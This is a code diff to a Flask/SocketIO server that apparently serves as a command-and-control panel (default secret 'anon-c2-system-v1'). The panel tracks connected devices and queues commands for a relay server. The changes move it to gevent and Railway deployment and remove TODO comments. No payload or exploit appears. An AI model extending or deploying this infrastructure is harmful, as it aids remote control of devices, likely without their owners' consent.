@@ -9,15 +9,27 @@ import threading
 import logging
 from queue import Queue
 import requests
+import sys
+
+# Import gevent di awal
+from gevent import monkey
+monkey.patch_all()
 
 app = Flask(__name__, template_folder='templates')
 app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'anon-c2-system-v1')
-socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')
+
+# SocketIO dengan gevent
+socketio = SocketIO(app, 
+                   cors_allowed_origins="*", 
+                   async_mode='gevent',
+                   ping_timeout=60,
+                   ping_interval=25)
 
 # --- Konfigurasi ---
-FLASK_PORT = int(os.environ.get('PORT', 9191))  # Railway uses PORT env var
+FLASK_PORT = int(os.environ.get('PORT', 9191))
 SERVER1_URL = os.environ.get('SERVER1_URL', 'http://localhost:9090')
 DEBUG = os.environ.get('DEBUG', 'False').lower() == 'true'
+RAILWAY_ENV = os.environ.get('RAILWAY_ENVIRONMENT', 'development')
 
 # --- Global Variables ---
 connected_devices = {}
@@ -50,7 +62,9 @@ def health():
     return jsonify({
         'status': 'healthy',
         'timestamp': datetime.now().isoformat(),
-        'devices_connected': len(connected_devices)
+        'devices_connected': len(connected_devices),
+        'environment': RAILWAY_ENV,
+        'async_mode': 'gevent'
     })
 
 @app.route('/api/devices')
@@ -113,9 +127,6 @@ def send_command():
     })
     
     logger.info(f"Command queued: {cmd_str} for device {current_device}")
-    
-    # TODO: Implement actual sending to server1
-    # Bisa via HTTP request ke server1 endpoint
     
     return jsonify({
         'status': 'queued',
@@ -418,15 +429,6 @@ def command_processor():
                 
                 # TODO: Implement actual sending to server1
                 # Bisa via HTTP if server1 has API, or via socket
-                # Contoh:
-                # try:
-                #     requests.post(
-                #         f"{SERVER1_URL}/command",
-                #         json=cmd_data,
-                #         timeout=2
-                #     )
-                # except:
-                #     logger.error("Failed to send command to server1")
                 
         except Exception as e:
             logger.error(f"Command processor error: {e}")
@@ -440,14 +442,13 @@ threading.Thread(target=command_processor, daemon=True).start()
 
 if __name__ == '__main__':
     logger.info(f"Starting Flask server on port {FLASK_PORT}")
+    logger.info(f"Environment: {RAILWAY_ENV}")
     logger.info(f"Debug mode: {DEBUG}")
+    logger.info(f"Async mode: gevent")
     
-    # Untuk production di Railway, gunakan eventlet langsung
-    if os.environ.get('RAILWAY_ENVIRONMENT') == 'production':
-        import eventlet
-        eventlet.wsgi.server(eventlet.listen(('0.0.0.0', FLASK_PORT)), app)
+    if RAILWAY_ENV == 'production':
+        # Untuk production, gunakan gunicorn via Procfile
+        logger.info("Running with gunicorn (via Procfile)")
     else:
+        # Untuk development
         socketio.run(app, host='0.0.0.0', port=FLASK_PORT, debug=DEBUG)
-        socketio.run(app, host='0.0.0.0', port=FLASK_PORT, debug=True)
-    else:
-        socketio.run(app, host='0.0.0.0', port=FLASK_PORT, debug=False)
